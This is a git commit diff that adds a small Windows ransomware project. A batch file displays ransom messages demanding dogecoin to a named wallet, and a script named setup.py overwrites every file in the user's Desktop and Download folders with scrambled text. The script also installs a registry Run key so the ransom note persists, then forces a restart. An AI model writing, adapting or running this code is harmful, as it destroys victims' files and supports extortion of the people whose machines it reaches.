fc311e761314330c07569453cc8ade72625c5161
BombaStudio <bombaoyun111@gmail.com>
2021-01-04 00:07:09 +0300

    Hi 2021

---
+++ rans_win/cw.bat
@@ -0,0 +1,4 @@
+msg * "Hacked by Cyber Wolfs"
+msg * "We are Anti-Elit team"
+msg * "So you must send 2340 dogecoin if you want key"
+msg * "doge wallet: DKAFPwVHjbVMSnn2gkzoCTTwAuTm54WnfS"
---
+++ rans_win/setup.py
@@ -0,0 +1,44 @@
+from sys import *
+import os
+
+
+def c(v,f):
+	keys = [
+		"0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23"
+	]
+	keys_a = [
+		"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","w","q","z"
+	]
+	for i in range(0,len(keys)):
+		v = v.replace(keys_a[i], " r"+keys[i]+" ")
+		print(v)
+	print(v)
+	f.write(v)
+
+def e(veri):
+	with open(veri,"r") as x:
+		x = x.read()
+	with open(veri, "w") as y:
+		"""
+		for z in range(0,len(x)):
+			#print(x(z))
+			c(x[z],y)
+		"""
+		c(x,y)
+		
+def rans(k):
+	for konum, gereksiz, liste in os.walk(k):
+		if liste:
+			for dosya in liste:
+				veri = konum+"/"+dosya
+				e(veri)
+				
+				
+
+rans(os.path.join(os.environ["HOMEPATH"], "Desktop"))
+rans(os.path.join(os.environ["HOMEPATH"], "Download"))
+
+os.system("copy cw.bat C:\\Users")
+os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "C:\\Users\\cw.bat"')
+
+os.system("shutdown -r")
